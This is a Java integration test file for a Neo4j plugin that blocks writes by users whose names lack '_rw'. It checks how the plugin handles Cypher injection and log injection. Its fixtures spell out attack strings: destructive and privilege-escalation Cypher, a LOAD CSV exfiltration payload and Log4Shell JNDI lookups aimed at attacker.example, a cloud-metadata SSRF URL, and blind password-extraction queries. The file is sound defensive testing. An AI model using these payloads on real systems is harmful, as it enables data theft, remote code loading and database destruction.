package com.mappedsky.neo4j;

import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Named;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.MethodSource;
import org.neo4j.driver.Driver;
import org.neo4j.driver.Session;
import org.neo4j.driver.SessionConfig;
import org.neo4j.driver.Transaction;
import org.neo4j.driver.exceptions.Neo4jException;

import java.util.List;
import java.util.Map;
import java.util.stream.Stream;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * Injection-resilience tests for the read-only plugin.
 *
 * <p>The plugin intercepts every transaction commit, inspects the
 * {@link org.neo4j.graphdb.event.TransactionData}, and blocks any write if the
 * authenticated username does not end with {@code _rw}.  Because the check is
 * at the commit level it is immune to query-level injection techniques – no
 * amount of Cypher trickery can bypass the transaction boundary.  These tests
 * confirm that invariant and also verify:
 *
 * <ol>
 *   <li><strong>Write-query injection patterns</strong> – destructive and
 *       privilege-escalation payloads are blocked for non-{@code _rw} users
 *       regardless of how they are constructed.</li>
 *   <li><strong>Payload storage</strong> – an {@code _rw} user can store
 *       Cypher-injection strings as property values without triggering any
 *       issue; the same writes are blocked for non-{@code _rw} users.</li>
 *   <li><strong>Log-injection hardening</strong> – property values containing
 *       newlines, JNDI strings, and other log-injection tokens do not crash or
 *       corrupt the plugin's logger.</li>
 *   <li><strong>LOAD CSV + write (SSRF + write)</strong> – even if a
 *       {@code LOAD CSV} payload reaches the graph, attaching any write
 *       operation is blocked for non-{@code _rw} users.</li>
 *   <li><strong>Parameterized queries</strong> – using driver-level parameters
 *       (the correct defence against injection) does not bypass the plugin's
 *       write check.</li>
 * </ol>
 *
 * <p>References:
 * <ul>
 *   <li>https://ayoubsafa.com/posts/Neo4j_injection_(Cypher-Injection)/</li>
 *   <li>https://neo4j.com/developer/kb/protecting-against-cypher-injection/</li>
 *   <li>https://hackmd.io/@Chivato/rkAN7Q9NY</li>
 *   <li>https://pentester.land/blog/cypher-injection-cheatsheet/</li>
 * </ul>
 */
class CypherInjectionIT {

    private static Driver rwDriver;
    private static Driver roDriver;

    @BeforeAll
    static void setup() {
        ContainerSetup.ADMIN_DRIVER.verifyConnectivity();
        rwDriver = ContainerSetup.driverFor(ContainerSetup.RW_USER);
        roDriver = ContainerSetup.driverFor(ContainerSetup.RO_USER);

        // Ensure seed data exists for UPDATE/DELETE injection tests.
        try (Session s = rwDriver.session(SessionConfig.forDatabase("neo4j"));
             Transaction tx = s.beginTransaction()) {
            tx.run("MERGE (n:InjBase {id:'seed'}) SET n.admin = false, n.value = 0");
            tx.commit();
        }
    }

    @BeforeEach
    void resetSeedNode() {
        // Restore seed node between tests so DELETE tests don't leave an empty graph.
        try (Session s = rwDriver.session(SessionConfig.forDatabase("neo4j"));
             Transaction tx = s.beginTransaction()) {
            tx.run("MERGE (n:InjBase {id:'seed'}) SET n.admin = false, n.value = 0");
            tx.commit();
        }
    }

    // ═════════════════════════════════════════════════════════════════════════
    // 1. Destructive / privilege-escalation write patterns
    //    Non-_rw users must be blocked regardless of how the write is formed.
    // ═════════════════════════════════════════════════════════════════════════

    static Stream<Named<String>> destructiveWritePatterns() {
        return Stream.of(

            // -- Basic destructive patterns -----------------------------------

            Named.of("DETACH DELETE all nodes",
                     "MATCH (n) DETACH DELETE n"),

            Named.of("DELETE via WITH (clause-chaining injection pattern)",
                     "WITH 1337 AS dummy MATCH (n) DETACH DELETE n"),

            Named.of("SET admin flag to true (privilege escalation via SET)",
                     "MATCH (n:InjBase) SET n.admin = true"),

            Named.of("SET using OR-always-true filter to update every node",
                     "MATCH (n) WHERE n.id = '' OR 1=1 SET n.owned = true"),

            Named.of("MERGE-based write (conditional create)",
                     "MERGE (n:InjMerge {x:1})"),

            Named.of("UNWIND + CREATE (data-injection simulation / LOAD CSV pattern)",
                     "UNWIND ['row1','row2','row3'] AS row CREATE (:Exfil {data: row})"),

            Named.of("CREATE relationship (new nodes + edge in single query)",
                     "CREATE (a:InjRel1 {x:1})-[:INJREL]->(b:InjRel2 {x:2})"),

            Named.of("REMOVE property (destructive property operation)",
                     "MATCH (n:InjBase {id:'seed'}) REMOVE n.value"),

            // -- Comment / whitespace bypass patterns -------------------------
            //
            // In Cypher injection, attackers embed '//' or '/*...*/' to truncate
            // or obscure query structure.  The plugin operates on TransactionData
            // after the query has already been parsed, so comments cannot change
            // what the plugin sees: a write is a write regardless of comments.

            Named.of("CREATE with trailing //-comment (comment truncation bypass)",
                     "CREATE (n:InjComment {x:1}) //trailing comment ignored by parser"),

            Named.of("CREATE with block-comment whitespace substitution (/**/ bypass)",
                     "CREATE/**/(n:InjComment/**/{x:1})"),

            Named.of("SET with inline comment mid-clause",
                     "MATCH (n:InjBase) SET/*force*/n.injected=true"),

            // -- Backtick / label injection -----------------------------------

            Named.of("SET via backtick-quoted label (label injection boundary)",
                     "MATCH (n:`InjBase`) SET n.via_backtick = true"),

            // -- Numeric context injection ------------------------------------
            //
            // When a parameter is numeric, no quoting is needed.  An attacker
            // could append logical operators directly: WHERE id = 1 OR 1=1.

            Named.of("Numeric injection: OR 1=1 in WHERE predicate triggers SET",
                     "MATCH (n) WHERE n.value = 0 OR 1=1 SET n.numeric_injected = true"),

            // -- UNION / RETURN chaining injection ----------------------------
            //
            // In web contexts, attackers inject UNION clauses to return extra data
            // or chain a second write.  The TransactionData boundary means any
            // write in ANY clause of the query is caught.

            // Note: UNION cannot contain write clauses in Cypher – a realistic
            // equivalent is injecting a write via a CALL {} subquery, which
            // Neo4j 5.x does allow inside a read query.
            Named.of("CALL-subquery write injection (inject write inside read via CALL {})",
                     "MATCH (n:InjBase) WHERE n.id = 'seed' "
                     + "CALL { MATCH (m:InjBase) SET m.via_call = true } "
                     + "RETURN n.id AS x"),

            Named.of("WITH-bridge to independent write (common WITH injection)",
                     "MATCH (n:InjBase) WITH n MATCH (m) SET m.with_injected = true")
        );
    }

    @ParameterizedTest(name = "{0}")
    @MethodSource("destructiveWritePatterns")
    @DisplayName("Non-_rw user is blocked from write: ")
    void nonRwUserIsBlockedFromDestructivePattern(String writeQuery) {
        expectBlocked(roDriver, writeQuery);
    }

    @ParameterizedTest(name = "{0}")
    @MethodSource("destructiveWritePatterns")
    @DisplayName("_rw user can execute same write: ")
    void rwUserCanExecuteSameWritePattern(String writeQuery) {
        // The same queries that are blocked for non-_rw must succeed for _rw users.
        try (Session s = rwDriver.session(SessionConfig.forDatabase("neo4j"));
             Transaction tx = s.beginTransaction()) {
            tx.run(writeQuery);
            assertThatCode(tx::commit).doesNotThrowAnyException();
        }
    }

    // ═════════════════════════════════════════════════════════════════════════
    // 2. Injection payloads stored as property values
    //    The value being an injection string changes nothing about whether it
    //    is a write.  An _rw user can store any value; others are blocked.
    // ═════════════════════════════════════════════════════════════════════════

    static Stream<Named<Map<String, Object>>> payloadValues() {
        String longString = "A".repeat(10_000);
        return Stream.of(
            Named.of("Classic Cypher OR-bypass payload",
                     Map.of("v", "' OR 1=1 RETURN n //")),
            Named.of("Clause-chaining DELETE payload",
                     Map.of("v", "WITH 1337 AS dummy MATCH (n) DETACH DELETE n //")),
            Named.of("LOAD CSV SSRF exfiltration payload",
                     Map.of("v", "LOAD CSV FROM 'http://attacker.example/exfil?data=' + n.secret AS x")),
            Named.of("Boolean-blind extraction payload",
                     Map.of("v", "' OR substring(n.password,0,1)='a' RETURN n //")),
            Named.of("CALL procedure payload",
                     Map.of("v", "CALL dbms.components() YIELD name RETURN name //")),
            Named.of("DROP DATABASE payload",
                     Map.of("v", "'; DROP DATABASE neo4j; //")),
            Named.of("Unicode-encoded single quote (\\u0027)",
                     Map.of("v", "\\u0027 OR 1=1 RETURN n //"))  ,
            Named.of("Very long string (10 000 chars, potential buffer concern)",
                     Map.of("v", longString)),
            Named.of("Multiple injection techniques in one property",
                     Map.of("v", "' OR 1=1// ' UNION MATCH (n) RETURN n //")),
            Named.of("Parameterized query: injection in parameter value, not in query string",
                     Map.of("v", "'; MATCH (n) DETACH DELETE n //"))
        );
    }

    @ParameterizedTest(name = "{0}")
    @MethodSource("payloadValues")
    @DisplayName("_rw user can store injection payload as property: ")
    void rwUserCanStoreInjectionPayloadAsProperty(Map<String, Object> params) {
        // Storing an injection string as a safe parameter is a legitimate write.
        try (Session s = rwDriver.session(SessionConfig.forDatabase("neo4j"));
             Transaction tx = s.beginTransaction()) {
            tx.run("CREATE (:InjPayload {data: $v})", params);
            assertThatCode(tx::commit).doesNotThrowAnyException();
        }
    }

    @ParameterizedTest(name = "{0}")
    @MethodSource("payloadValues")
    @DisplayName("Non-_rw user is blocked even when storing injection payload: ")
    void nonRwUserIsBlockedFromStoringPayload(Map<String, Object> params) {
        // Even a "harmless" CREATE is blocked – the plugin sees a write regardless
        // of whether the content is an injection string or plain data.
        expectBlocked(roDriver, "CREATE (:InjPayload {data: $v})", params);
    }

    // ═════════════════════════════════════════════════════════════════════════
    // 3. Log-injection hardening
    //    Property values that contain newlines, JNDI patterns, or other tokens
    //    used in log-injection attacks must not crash or corrupt the plugin.
    // ═════════════════════════════════════════════════════════════════════════

    static Stream<Named<String>> logInjectionValues() {
        return Stream.of(
            Named.of("Newline + fake log line (classic log-injection)",
                     "\n[FATAL] ReadOnlyPlugin: registered transaction event listener on database 'neo4j'"),
            Named.of("CR+LF injection",
                     "\r\nFAKE LOG ENTRY: Write transaction by user 'attacker_rw'"),
            Named.of("Log4Shell JNDI pattern",
                     "${jndi:ldap://attacker.example/exploit}"),
            Named.of("Log4Shell nested lookup",
                     "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example/a}"),
            Named.of("Spring EL / Logback expression",
                     "${spring.application.name}"),
            Named.of("Null byte",
                     "before\u0000after"),
            Named.of("Tab and vertical tab characters",
                     "col1\tcol2\u000Bcol3"),
            Named.of("ANSI escape sequence (terminal injection)",
                     "\u001b[31mRED\u001b[0m")
        );
    }

    @ParameterizedTest(name = "{0}")
    @MethodSource("logInjectionValues")
    @DisplayName("Plugin does not crash when _rw user stores log-injection value: ")
    void pluginDoesNotCrashOnLogInjectionValues(String logPayload) {
        // _rw user stores the value; the plugin logs the change summary (including
        // counts) without interpolating the property value into the log message,
        // so these should all commit successfully without throwing.
        try (Session s = rwDriver.session(SessionConfig.forDatabase("neo4j"));
             Transaction tx = s.beginTransaction()) {
            tx.run("CREATE (:LogInject {val: $v})", Map.of("v", logPayload));
            assertThatCode(tx::commit).doesNotThrowAnyException();
        }
    }

    @Test
    @DisplayName("Multiple log-injection payloads in a single transaction do not crash the plugin")
    void bulkLogInjectionDoesNotCrash() {
        List<String> payloads = List.of(
                "${jndi:ldap://attacker.example/a}",
                "\nFAKE INFO line",
                "\r\nFAKE INFO line 2",
                "${spring.profiles.active}",
                "normal value");

        try (Session s = rwDriver.session(SessionConfig.forDatabase("neo4j"));
             Transaction tx = s.beginTransaction()) {
            for (String p : payloads) {
                tx.run("CREATE (:BulkLogInject {val: $v})", Map.of("v", p));
            }
            assertThatCode(tx::commit).doesNotThrowAnyException();
        }

        // Verify all nodes were actually committed.
        try (Session s = rwDriver.session(SessionConfig.forDatabase("neo4j"))) {
            long count = s.run("MATCH (n:BulkLogInject) RETURN count(n) AS c")
                          .single().get("c").asLong();
            assertThat(count).isEqualTo(payloads.size());
        }
    }

    // ═════════════════════════════════════════════════════════════════════════
    // 4. LOAD CSV + write (SSRF vector with write side-effect)
    //    LOAD CSV alone is a read; attaching a CREATE or SET makes it a write.
    //    That write must be blocked for non-_rw users.
    // ═════════════════════════════════════════════════════════════════════════

    @Test
    @DisplayName("Non-_rw user: LOAD CSV + CREATE is blocked (SSRF+write pattern)")
    void nonRwUserCannotLoadCsvAndCreate() {
        // The URL is intentionally unreachable – we want to confirm that even if
        // the network call succeeded, the downstream CREATE would be blocked.
        // Neo4j evaluates lazily; if the URL fails before producing rows the write
        // never executes and we get a network error instead of our plugin error.
        // Both outcomes correctly prevent data exfiltration / injection.
        // The error may fire during run() (if LOAD CSV fails immediately) or
        // during commit() (if Neo4j defers execution).  Either way it must be
        // a Neo4jException – the write never reaches the database.
        try (Session s = roDriver.session(SessionConfig.forDatabase("neo4j"));
             Transaction tx = s.beginTransaction()) {
            assertThatThrownBy(() -> {
                tx.run("LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/' AS row "
                       + "CREATE (:ExfilNode {data: row[0]})");
                tx.commit();
            }).isInstanceOf(Neo4jException.class);
        }
    }

    @Test
    @DisplayName("_rw user: UNWIND + CREATE (LOAD CSV simulation) succeeds")
    void rwUserCanExecuteUnwindCreate() {
        // Simulate the write side of a LOAD CSV attack with UNWIND so we are not
        // dependent on network connectivity.  Should succeed for _rw users.
        try (Session s = rwDriver.session(SessionConfig.forDatabase("neo4j"));
             Transaction tx = s.beginTransaction()) {
            tx.run("UNWIND ['r1','r2'] AS row CREATE (:SimulatedExfil {data: row})");
            assertThatCode(tx::commit).doesNotThrowAnyException();
        }
    }

    @Test
    @DisplayName("Non-_rw user: UNWIND + CREATE (LOAD CSV simulation) is blocked")
    void nonRwUserCannotExecuteUnwindCreate() {
        expectBlocked(roDriver,
                "UNWIND ['r1','r2'] AS row CREATE (:SimulatedExfil {data: row})");
    }

    // ═════════════════════════════════════════════════════════════════════════
    // 5. Enumeration / information-disclosure reads
    //    Read-only procedures must work for any user (including ro users);
    //    the plugin must not interfere.
    // ═════════════════════════════════════════════════════════════════════════

    @Test
    @DisplayName("Non-_rw user can enumerate labels (db.labels)")
    void nonRwUserCanCallDbLabels() {
        try (Session s = roDriver.session(SessionConfig.forDatabase("neo4j"))) {
            var result = s.run("CALL db.labels() YIELD label RETURN label").list();
            assertThat(result).isNotNull();
        }
    }

    @Test
    @DisplayName("Non-_rw user can read DBMS components (dbms.components)")
    void nonRwUserCanCallDbmsComponents() {
        try (Session s = roDriver.session(SessionConfig.forDatabase("neo4j"))) {
            var result = s.run(
                    "CALL dbms.components() YIELD name, versions, edition RETURN name, versions, edition"
            ).list();
            assertThat(result).isNotEmpty();
        }
    }

    @Test
    @DisplayName("Non-_rw user can enumerate property keys on a label")
    void nonRwUserCanEnumeratePropertyKeys() {
        try (Session s = roDriver.session(SessionConfig.forDatabase("neo4j"))) {
            var keys = s.run("MATCH (n:InjBase) RETURN DISTINCT keys(n) AS k").list();
            assertThat(keys).isNotEmpty();
        }
    }

    @Test
    @DisplayName("Boolean-blind read inference: substring() in WHERE is allowed (read-only)")
    void nonRwUserCanUseBooleanBlindReadPattern() {
        // A classic blind-injection payload used for data extraction is to add
        // substring() conditions to WHERE.  As a pure read this must pass through.
        try (Session s = roDriver.session(SessionConfig.forDatabase("neo4j"))) {
            // If InjBase nodes existed with a 'password' property this would be
            // the exfiltration query; as a read the plugin does not block it.
            var result = s.run(
                    "MATCH (n:InjBase) WHERE n.id = 'seed' "
                    + "AND substring(coalesce(n.id,''),0,1) = 's' "
                    + "RETURN n.id AS id").list();
            assertThat(result).isNotEmpty();
        }
    }

    // ═════════════════════════════════════════════════════════════════════════
    // Helpers
    // ═════════════════════════════════════════════════════════════════════════

    private static void expectBlocked(Driver driver, String query) {
        expectBlocked(driver, query, Map.of());
    }

    private static void expectBlocked(Driver driver, String query, Map<String, Object> params) {
        try (Session s = driver.session(SessionConfig.forDatabase("neo4j"));
             Transaction tx = s.beginTransaction()) {
            tx.run(query, params);
            assertThatThrownBy(tx::commit)
                    .isInstanceOf(Neo4jException.class)
                    .hasMessageContaining("not permitted");
        }
    }
}
